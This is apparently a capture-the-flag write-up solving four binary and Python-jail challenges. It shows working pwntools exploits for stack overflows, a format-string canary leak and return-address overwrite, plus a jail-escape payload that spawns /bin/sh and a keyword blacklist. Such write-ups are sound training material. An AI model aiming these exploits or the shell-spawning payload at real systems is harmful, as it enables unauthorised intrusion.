# Challenge name: A Kind of Magic

### Description
You're a magic man aren't you? Well can you show me?

## Pseudocode
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int v5; // [rsp+3Ch] [rbp-4h]

  v5 = 0;
  puts("Is this a kind of magic? What is your magic?: ");
  fflush(_bss_start);
  fgets(s, 64, stdin);
  printf("You entered %s\n", s);
  printf("Your magic is: %d\n", v5);
  fflush(_bss_start);
  if ( v5 == 1337 )
  {
    puts("Whoa we got a magic man here!");
    fflush(_bss_start);
    system("cat flag.txt");
  }
  else
  {
    puts("You need to challenge the doors of time");
    fflush(_bss_start);
  }
  return 0;
}
```

## Assembly code
```assembly
.text:00000000000011C9 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00000000000011C9                 public main
.text:00000000000011C9 main            proc near               ; DATA XREF: _start+21↑o
.text:00000000000011C9
.text:00000000000011C9 var_40          = qword ptr -40h
.text:00000000000011C9 var_34          = dword ptr -34h
.text:00000000000011C9 s               = byte ptr -30h
.text:00000000000011C9 var_4           = dword ptr -4
.text:00000000000011C9
.text:00000000000011C9 ; __unwind {
.text:00000000000011C9                 endbr64
.text:00000000000011CD                 push    rbp
.text:00000000000011CE                 mov     rbp, rsp
.text:00000000000011D1                 sub     rsp, 40h
.text:00000000000011D5                 mov     [rbp+var_34], edi
.text:00000000000011D8                 mov     [rbp+var_40], rsi
.text:00000000000011DC                 mov     [rbp+var_4], 0
.text:00000000000011E3                 lea     rdi, s          ; "Is this a kind of magic? What is your m"...
.text:00000000000011EA                 call    _puts
.text:00000000000011EF                 mov     rax, cs:__bss_start
.text:00000000000011F6                 mov     rdi, rax        ; stream
.text:00000000000011F9                 call    _fflush
.text:00000000000011FE                 mov     rdx, cs:stdin@GLIBC_2_2_5 ; stream
.text:0000000000001205                 lea     rax, [rbp+s]
.text:0000000000001209                 mov     esi, 40h ; '@'  ; n
.text:000000000000120E                 mov     rdi, rax        ; s
.text:0000000000001211                 call    _fgets
.text:0000000000001216                 lea     rax, [rbp+s]
.text:000000000000121A                 mov     rsi, rax
.text:000000000000121D                 lea     rdi, format     ; "You entered %s\n"
.text:0000000000001224                 mov     eax, 0
.text:0000000000001229                 call    _printf
.text:000000000000122E                 mov     eax, [rbp+var_4]
.text:0000000000001231                 mov     esi, eax
.text:0000000000001233                 lea     rdi, aYourMagicIsD ; "Your magic is: %d\n"
.text:000000000000123A                 mov     eax, 0
.text:000000000000123F                 call    _printf
.text:0000000000001244                 mov     rax, cs:__bss_start
.text:000000000000124B                 mov     rdi, rax        ; stream
.text:000000000000124E                 call    _fflush
.text:0000000000001253                 cmp     [rbp+var_4], 539h
.text:000000000000125A                 jnz     short loc_1285
.text:000000000000125C                 lea     rdi, aWhoaWeGotAMagi ; "Whoa we got a magic man here!"
.text:0000000000001263                 call    _puts
.text:0000000000001268                 mov     rax, cs:__bss_start
.text:000000000000126F                 mov     rdi, rax        ; stream
.text:0000000000001272                 call    _fflush
.text:0000000000001277                 lea     rdi, command    ; "cat flag.txt"
.text:000000000000127E                 call    _system
.text:0000000000001283                 jmp     short loc_12A0
.text:0000000000001285 ; ---------------------------------------------------------------------------
.text:0000000000001285
.text:0000000000001285 loc_1285:                               ; CODE XREF: main+91↑j
.text:0000000000001285                 lea     rdi, aYouNeedToChall ; "You need to challenge the doors of time"
.text:000000000000128C                 call    _puts
.text:0000000000001291                 mov     rax, cs:__bss_start
.text:0000000000001298                 mov     rdi, rax        ; stream
.text:000000000000129B                 call    _fflush
.text:00000000000012A0
.text:00000000000012A0 loc_12A0:                               ; CODE XREF: main+BA↑j
.text:00000000000012A0                 mov     eax, 0
.text:00000000000012A5                 leave
.text:00000000000012A6                 retn
.text:00000000000012A6 ; } // starts at 11C9
.text:00000000000012A6 main            endp
```

## Checksec
![image](https://user-images.githubusercontent.com/69805864/139613530-4cfdc6f0-7f57-4b66-a883-32751ccf214c.png)


## Methodology
From the code, we can see that `v5` is set to 0 but in after a few lines it check `if v5 == 1337`, user's input is `s` but it allow entering 64 bytes while `s` is defined above with 44 bytes. So this may cause a buffer overflow vulnerable. Exploit plan:
1. Identify offset from our input to `v5`
2. Overwrite `v5`

## Exploit

Base on the assembly code above, we have a stack like this:
 
 ![image](https://user-images.githubusercontent.com/69805864/139615386-d0c3b046-0190-4596-b8c4-5a6e8cbf1025.png)

So our payload should be have first 44 bytes for padding and last 4 bytes to override `v5` which is `1337` or  `0x539` in hex.

### Exploit code

```python
from pwn import *
#r = process('./akindofmagic')
r = remote('143.198.184.186', 5000)
#raw_input('>>')
pl = b'A'*44

pl += p32(0x539)
r.sendline(pl)
r.interactive()
```

Run the code and we wil get the flag

![image](https://user-images.githubusercontent.com/69805864/139617352-d7663cc0-d0ba-4b51-b109-3fe41fad1d77.png)

## Flag
flag{i_hope_its_still_cool_to_use_1337_for_no_reason}



# ==========================================================================================

# Challenge name: zoom2win

### Description
NamOcCho

## Pseudocode
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Let's not overcomplicate. Just zoom2win :)");
  return gets(v4, argv);
}
```

## Assembly code
```assembly
.text:00000000004011B2 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00000000004011B2                 public main
.text:00000000004011B2 main            proc near               ; DATA XREF: _start+21↑o
.text:00000000004011B2
.text:00000000004011B2 var_20          = byte ptr -20h
.text:00000000004011B2
.text:00000000004011B2 ; __unwind {
.text:00000000004011B2                 endbr64
.text:00000000004011B6                 push    rbp
.text:00000000004011B7                 mov     rbp, rsp
.text:00000000004011BA                 sub     rsp, 20h
.text:00000000004011BE                 lea     rdi, s          ; "Let's not overcomplicate. Just zoom2win"...
.text:00000000004011C5                 call    _puts
.text:00000000004011CA                 lea     rax, [rbp+var_20]
.text:00000000004011CE                 mov     rdi, rax
.text:00000000004011D1                 mov     eax, 0
.text:00000000004011D6                 call    _gets
.text:00000000004011DB                 nop
.text:00000000004011DC                 leave
.text:00000000004011DD                 retn
.text:00000000004011DD ; } // starts at 4011B2
.text:00000000004011DD main            endp
```

## Checksec

![image](https://user-images.githubusercontent.com/69805864/139616292-4a83d71e-32ff-4d7e-bc41-606283ff44a8.png)


## Methodology
From the code, we can see that user's input is `v4` and it uses `gets`, it may cause a buffer overflow vulnerable because of not checking the input lenght. There are no more code in main function so let's find other functions.

![image](https://user-images.githubusercontent.com/69805864/139617166-49cba940-367c-492d-82eb-a29774244a3a.png)

```assembly
.text:0000000000401196
.text:0000000000401196                 public flag
.text:0000000000401196 flag            proc near
.text:0000000000401196 ; __unwind {
.text:0000000000401196                 endbr64
.text:000000000040119A                 push    rbp
.text:000000000040119B                 mov     rbp, rsp
.text:000000000040119E                 lea     rdi, command    ; "cat flag.txt"
.text:00000000004011A5                 mov     eax, 0
.text:00000000004011AA                 call    _system
.text:00000000004011AF                 nop
.text:00000000004011B0                 pop     rbp
.text:00000000004011B1                 retn
.text:00000000004011B1 ; } // starts at 401196
.text:00000000004011B1 flag            endp
```

There is a flag function so we can redirect the program to this function to print the flag

Exploit plan:
1. Identify offset from our input to `return address` of stack
2. Overwrite `return address` of stack to redirect to flag function

## Exploit

Base on the assembly code above, we have a stack like this:
 
![image](https://user-images.githubusercontent.com/69805864/139619860-ea939759-c5e6-4772-9fc9-5b1b322cea37.png)

So our payload should be have first 40 bytes for padding and last 8 bytes to override `return address` with address of flag function which is `0x40119B`.

### Exploit code

```python
from pwn import *

LOCAL = 0

if LOCAL:
	r = process('./zoom2win')

	raw_input('>>')
else:
	r = remote('143.198.184.186', 5003)
	
offset = 40
flag = 0x40119B

print(r.recvline())

pl = b'A' * offset
pl += p64(flag)

r.sendline(pl)
print(r.recvline())
```

Run the code and we wil get the flag

![image](https://user-images.githubusercontent.com/69805864/139620143-ea7b5633-e705-4b27-84b4-2936c30d4802.png)

## Flag
kqctf{did_you_zoom_the_basic_buffer_overflow_?}



# ==========================================================================================

# Challenge name: tweetybirb

### Description
NamOcCho

## Pseudocode
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format[72]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts(
    "What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb prot"
    "ectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?");
  gets(format, argv);
  printf(format);
  puts("\nhmmm interesting. What about water fowl?");
  gets(format, argv);
  return 0;
}
```

## Assembly code
```assembly
.text:00000000004011F2 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00000000004011F2                 public main
.text:00000000004011F2 main            proc near               ; DATA XREF: _start+21↑o
.text:00000000004011F2
.text:00000000004011F2 format          = byte ptr -50h
.text:00000000004011F2 var_8           = qword ptr -8
.text:00000000004011F2
.text:00000000004011F2 ; __unwind {
.text:00000000004011F2                 endbr64
.text:00000000004011F6                 push    rbp
.text:00000000004011F7                 mov     rbp, rsp
.text:00000000004011FA                 sub     rsp, 50h
.text:00000000004011FE                 mov     rax, fs:28h
.text:0000000000401207                 mov     [rbp+var_8], rax
.text:000000000040120B                 xor     eax, eax
.text:000000000040120D                 lea     rdi, s          ; "What are these errors the compiler is g"...
.text:0000000000401214                 call    _puts
.text:0000000000401219                 lea     rax, [rbp+format]
.text:000000000040121D                 mov     rdi, rax
.text:0000000000401220                 mov     eax, 0
.text:0000000000401225                 call    _gets
.text:000000000040122A                 lea     rax, [rbp+format]
.text:000000000040122E                 mov     rdi, rax        ; format
.text:0000000000401231                 mov     eax, 0
.text:0000000000401236                 call    _printf
.text:000000000040123B                 lea     rdi, aHmmmInterestin ; "\nhmmm interesting. What about water fo"...
.text:0000000000401242                 call    _puts
.text:0000000000401247                 lea     rax, [rbp+format]
.text:000000000040124B                 mov     rdi, rax
.text:000000000040124E                 mov     eax, 0
.text:0000000000401253                 call    _gets
.text:0000000000401258                 mov     eax, 0
.text:000000000040125D                 mov     rdx, [rbp+var_8]
.text:0000000000401261                 xor     rdx, fs:28h
.text:000000000040126A                 jz      short locret_401271
.text:000000000040126C                 call    ___stack_chk_fail
.text:0000000000401271 ; ---------------------------------------------------------------------------
.text:0000000000401271
.text:0000000000401271 locret_401271:                          ; CODE XREF: main+78↑j
.text:0000000000401271                 leave
.text:0000000000401272                 retn
.text:0000000000401272 ; } // starts at 4011F2
.text:0000000000401272 main            endp
```

## Checksec

![image](https://user-images.githubusercontent.com/69805864/139622714-851f2975-b7b8-4bb0-b7dd-9f46b47ea4b6.png)


## Methodology
As we can see this challenge is similar to the zoom2win challenge, but this challenge has stack canary. So we have to detect the canary value to bypass it.

Exploit plan:
1. Identify offset from our input to `return address` of stack
2. Find canary value
3. Overwrite `return address` of stack to redirect to win function

## Exploit

Base on the assembly code above, we have a stack like this:
 
![image](https://user-images.githubusercontent.com/69805864/139623464-b8cd7c03-a7bc-4423-ae3b-0d6d240b8972.png)



According the disassembly code of main we know that this is a Random XOR canary
```assembly
   0x00000000004011f2 <+0>:     endbr64 
   0x00000000004011f6 <+4>:     push   rbp
   0x00000000004011f7 <+5>:     mov    rbp,rsp
   0x00000000004011fa <+8>:     sub    rsp,0x50
   0x00000000004011fe <+12>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401207 <+21>:    mov    QWORD PTR [rbp-0x8],rax
   .......
   0x0000000000401258 <+102>:   mov    eax,0x0
   0x000000000040125d <+107>:   mov    rdx,QWORD PTR [rbp-0x8]
=> 0x0000000000401261 <+111>:   xor    rdx,QWORD PTR fs:0x28       <==
   0x000000000040126a <+120>:   je     0x401271 <main+127>
   0x000000000040126c <+122>:   call   0x4010a0 <__stack_chk_fail@plt>
   0x0000000000401271 <+127>:   leave  
   0x0000000000401272 <+128>:   ret    

```



We can find the canary value by using %[offset]$p (brute force offset) via the format string vulnerable. Additionally, the canary value ends in 00 and looks very random, unlike the libc and stack addresses that start with f7 and ff.

![image](https://user-images.githubusercontent.com/69805864/139624575-aa3a0467-84e8-47bd-924f-ed165f6de453.png)

Here is the code to brute force the offset
```python
from pwn import *

for i in range(10, 16):
  try:
    sh = remote('143.198.184.186', 5002)
    sh.sendlineafter('magpies?\n', '%{}$p'.format(i))
    print (i, sh.recvline())
    sh.close()
  except EOFError:
    pass

```

It appears to be at `%15$p`. Remember, stack canaries are randomised for each new process, so it won't be the same.

![image](https://user-images.githubusercontent.com/69805864/139625250-4a2eea70-55af-4929-8f93-96ec6c30c417.png)


Fortunately, there are 2 `gets` in program so the first input we use to get canary value and the second we use to send our payload.
The format of payload like the stack above, it should be have first 72 bytes to padding to canary, next is 8 bytes of canary, next is 8 bytes to padding to return address and last 8 bytes to overwrite return address.

### Exploit code

```python
from pwn import *

LOCAL = 0

if LOCAL:
	r = process('./tweetybirb')
	raw_input('>>')
else:
	r = remote('143.198.184.186', 5002)
	
flag = 0x4011DE
offset = 72


print(r.recv())

r.sendline('%15$p')	# get canary value in the first gets
canary = int(r.recvline(), 16)
log.success(f'Canary: {hex(canary)}')


pl = b'A' * offset
pl += p64(canary)
pl += b'B' * 8
pl += p64(flag)

print(r.recvline())
r.sendline(pl)	# send payload in the second gets
print(r.recvline())
r.interactive()
```

Run the code and we wil get the flag

![image](https://user-images.githubusercontent.com/69805864/139626811-d315312c-beb3-49c7-a319-640694ea8901.png)

## Flag
kqctf{tweet_tweet_did_you_leak_or_bruteforce_...\_plz_dont_say_you_tried_bruteforce}



# ==========================================================================================


# Challenge name: I want to break free

### Description
NamOcCho

## Code
```python
#!/usr/bin/env python3

def server():
    message = """
    You are in jail. Can you escape?
"""
    print(message)
    while True:
        try:
            data = input("> ")
            safe = True
            for char in data:
                if not (ord(char)>=33 and ord(char)<=126):
                    safe = False
            with open("blacklist.txt","r") as f:
                badwords = f.readlines()
            for badword in badwords:
                if badword in data or data in badword:
                    safe = False
            if safe:
                print(exec(data))
            else:
                print("You used a bad word!")
        except Exception as e:
            print("Something went wrong.")
            print(e)
            exit()

if __name__ == "__main__":
    server()
```
Blacklist
```
cat
grep
nano
import
eval
subprocess
input
sys
execfile
builtins
open
dict
exec
for
dir
file
input
write
while
echo
print
int
os
```

## Methodology
The vulnerable in this challenge is at line `print(exec(data))`, this mean the program will execute our input. But our input is filtered by blacklist so we have to bypass it with some tricks like use .lower(), add string, convert string to octal, etc.

## Payload
We can enter this payload to get the shell and do anything we want: `__import__('o'+'s').system('/bin/sh')`

![image](https://user-images.githubusercontent.com/69805864/139630215-d48d4dbf-b723-4a50-9a5f-3f39afb680cf.png)


## Flag
kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}


# ==========================================================================================
